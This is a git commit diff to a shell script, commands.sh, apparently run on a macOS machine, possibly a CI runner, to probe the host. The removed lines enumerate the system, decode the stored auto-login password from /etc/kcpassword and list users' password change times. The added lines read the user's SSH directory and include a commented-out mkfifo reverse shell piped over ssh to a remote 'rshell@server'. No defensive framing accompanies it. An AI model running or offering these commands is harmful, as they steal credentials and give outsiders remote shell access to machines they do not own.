05a91968be1fb05cc126f226c6fcf52bca4bfb60
vulnbase <40605654+vulnbase@users.noreply.github.com>
2022-01-04 15:12:39 +0000

    f

--- commands.sh
+++ commands.sh
@@ -1,15 +1,5 @@
 #!/bin/bash
 
-hostname
-id
-#ps -eaf 
-uname -a
-uptime
-netstat -an
-mount
-ifconfig -a
-python ./kcpass.py \$(xxd -p /etc/kcpassword)
-#ls -la /var/db/dslocal/nodes/Default/users/
-#plutil -convert xml1 -o - /var/db/dslocal/nodes/Default/users/root.plist
-#plutil -convert xml1 -o - cat /var/db/dslocal/nodes/Default/users/runner.plist
-echo Password Last Changed:; u=$(dscl . list /Users | egrep -v '^_|daemon|nobody'); for i in $u; do printf \\n$i\\t; currentUser=$i;t=$(dscl . read /Users/"$currentUser" | grep -A1 passwordLastSetTime | grep real | awk -F'real>|</real' '{print $2}'); date -j -f %s "$t" 2> /dev/null; done
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa.pub
+#mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i ~/.ssh/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f
